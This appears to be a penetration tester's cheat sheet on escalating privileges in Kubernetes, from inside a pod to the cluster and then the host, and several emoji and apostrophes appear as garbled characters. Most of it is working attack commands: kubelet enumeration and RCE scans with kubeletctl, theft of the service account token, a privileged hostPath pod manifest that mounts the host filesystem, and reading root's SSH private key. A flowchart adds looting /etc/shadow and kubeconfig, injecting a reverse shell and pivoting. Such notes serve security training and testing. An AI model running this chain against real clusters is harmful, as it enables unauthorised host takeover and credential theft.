ğŸ§  Kubernetes Privilege Escalation - Summary & Workflow
ğŸ” Kubernetes Overview (K8s)
Kubernetes = container orchestration platform.

Runs containers in pods, which live on worker nodes.

All pods are controlled via the control plane (master).

Secure by design â€” but if misconfigured, it's a gold mine for attackers.

ğŸ—ï¸ Core Components
âœ… Control Plane (Master Node)
Handles:

Scheduling (where pods go)

Cluster state (etcd DB)

Exposes the API (used via kubectl, kubelet, etc.)

Ports to watch:

Service	Port
etcd	2379/2380
K8s API server	6443
Kubelet API (read)	10255
Kubelet API (admin)	10250
âœ… Worker Nodes (Minions)
Actually run the containers.

Controlled by the master node.

Each pod = isolated app instance, with its own IP, storage, etc.

ğŸ”“ Initial Enumeration Steps
Check if youâ€™re inside a pod:

bash
Copy
Edit
ps aux | grep kube
Ping the Kubernetes API from inside the pod:

bash
Copy
Edit
curl -k https://<IP>:6443
If you get a 403 with system:anonymous, youâ€™re unauthenticated but possibly able to enumerate some stuff.

Try Kubelet unauthenticated:

bash
Copy
Edit
curl -k https://<IP>:10250/pods | jq .
Or with kubeletctl:

bash
Copy
Edit
kubeletctl --server <IP> pods
ğŸ§ª What You Might Discover
Running pods and containers

Metadata like:

Image versions

Namespace structure

Applied configs

Potential secrets

ğŸš¨ Remote Command Execution Check
Scan all pods for RCE access:

bash
Copy
Edit
kubeletctl --server <IP> scan rce
If RCE: +, try this:

bash
Copy
Edit
kubeletctl --server <IP> exec "id" -p <pod> -c <container>
Root inside? Game on.

ğŸ› ï¸ Escalate Privileges with Service Account Token
From inside the container (if root), grab the token and cert:

bash
Copy
Edit
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
Use it to authenticate to the API:

bash
Copy
Edit
export token=$(cat token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
Check for verbs like:

create

list

get

exec

If you have these for pods, you can do almost anything.

ğŸ§¬ Create a Privileged Pod to Escape
Write a YAML file to mount host root /:

yaml
Copy
Edit
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt/root
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
  hostNetwork: true
  automountServiceAccountToken: true
Apply the pod:

bash
Copy
Edit
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
Drop in and extract keys, passwords, sensitive configs:

bash
Copy
Edit
kubeletctl --server <IP> exec "cat /mnt/root/root/.ssh/id_rsa" -p privesc -c privesc
ğŸ” Kubernetes Privilege Escalation - ITTT Flowchart
markdown
Copy
Edit
ğŸ¯ Goal: Privilege Escalation from Pod â†’ Cluster â†’ Host

IF inside a K8s Pod:
    THEN check access to kubelet API (10250):
        â†’ IF accessible:
            â†’ ENUMERATE pods, namespaces, images, and configs
            â†’ TRY RCE via kubeletctl scan rce
                â†’ IF RCE works AND root inside container:
                    â†’ cat /var/run/secrets/.../token
                    â†’ cat /var/run/secrets/.../ca.crt
                    â†’ EXPORT token + cert

                    THEN:
                        â†’ Use kubectl to run: 
                          auth can-i --list

                        IF can create pods:
                            â†’ Create pod with hostPath: /
                            â†’ Mount host FS to /mnt/root
                            â†’ EXEC into pod, loot /mnt/root
                            â†’ Look for:
                                - id_rsa
                                - /etc/shadow
                                - /etc/kubernetes
                                - .kube/config
                        ELSE:
                            â†’ Use RCE access to:
                                - Inject reverse shell
                                - Dump secrets
                                - Pivot laterally

        ELSE try 6443 API endpoint:
            â†’ curl -k https://<IP>:6443
            â†’ IF 403 with "system:anonymous"
                â†’ Not authenticated. Try other auth methods or loot more.

        IF kubeletctl not available:
            â†’ curl manually
            â†’ Look in /var/run/secrets/... for service account

        IF token grants perms like get/create/exec:
            â†’ Same pod creation / escape strategy applies
